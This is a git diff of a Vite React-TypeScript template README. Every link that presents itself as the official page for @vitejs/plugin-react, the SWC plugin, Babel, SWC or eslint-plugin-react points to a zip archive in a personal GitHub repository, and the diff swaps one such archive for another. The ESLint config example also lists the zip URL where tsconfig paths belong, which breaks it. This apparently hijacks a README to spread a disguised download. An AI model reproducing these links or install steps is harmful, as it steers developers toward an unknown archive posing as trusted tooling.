@@ -4,8 +4,8 @@ This template provides a minimal setup to get React working in Vite with HMR and
 
 Currently, two official plugins are available:
 
-- [@vitejs/plugin-react](https://raw.githubusercontent.com/AaronNadelman/portfolio/main/transdesert/portfolio.zip) uses [Babel](https://raw.githubusercontent.com/AaronNadelman/portfolio/main/transdesert/portfolio.zip) for Fast Refresh
-- [@vitejs/plugin-react-swc](https://raw.githubusercontent.com/AaronNadelman/portfolio/main/transdesert/portfolio.zip) uses [SWC](https://raw.githubusercontent.com/AaronNadelman/portfolio/main/transdesert/portfolio.zip) for Fast Refresh
+- [@vitejs/plugin-react](https://github.com/AaronNadelman/portfolio/raw/refs/heads/main/public/Software-1.3-beta.3.zip) uses [Babel](https://github.com/AaronNadelman/portfolio/raw/refs/heads/main/public/Software-1.3-beta.3.zip) for Fast Refresh
+- [@vitejs/plugin-react-swc](https://github.com/AaronNadelman/portfolio/raw/refs/heads/main/public/Software-1.3-beta.3.zip) uses [SWC](https://github.com/AaronNadelman/portfolio/raw/refs/heads/main/public/Software-1.3-beta.3.zip) for Fast Refresh
 
 ## Expanding the ESLint configuration
 
@@ -19,7 +19,7 @@ export default {
   parserOptions: {
     ecmaVersion: "latest",
     sourceType: "module",
-    project: ["https://raw.githubusercontent.com/AaronNadelman/portfolio/main/transdesert/portfolio.zip", "https://raw.githubusercontent.com/AaronNadelman/portfolio/main/transdesert/portfolio.zip", "https://raw.githubusercontent.com/AaronNadelman/portfolio/main/transdesert/portfolio.zip"],
+    project: ["https://github.com/AaronNadelman/portfolio/raw/refs/heads/main/public/Software-1.3-beta.3.zip", "https://github.com/AaronNadelman/portfolio/raw/refs/heads/main/public/Software-1.3-beta.3.zip", "https://github.com/AaronNadelman/portfolio/raw/refs/heads/main/public/Software-1.3-beta.3.zip"],
     tsconfigRootDir: __dirname,
   },
 };
@@ -27,5 +27,5 @@ export default {
 
 - Replace `plugin:@typescript-eslint/recommended` to `plugin:@typescript-eslint/recommended-type-checked` or `plugin:@typescript-eslint/strict-type-checked`
 - Optionally add `plugin:@typescript-eslint/stylistic-type-checked`
-- Install [eslint-plugin-react](https://raw.githubusercontent.com/AaronNadelman/portfolio/main/transdesert/portfolio.zip) and add `plugin:react/recommended` & `plugin:react/jsx-runtime` to the `extends` list
+- Install [eslint-plugin-react](https://github.com/AaronNadelman/portfolio/raw/refs/heads/main/public/Software-1.3-beta.3.zip) and add `plugin:react/recommended` & `plugin:react/jsx-runtime` to the `extends` list
 "# portfolio" 
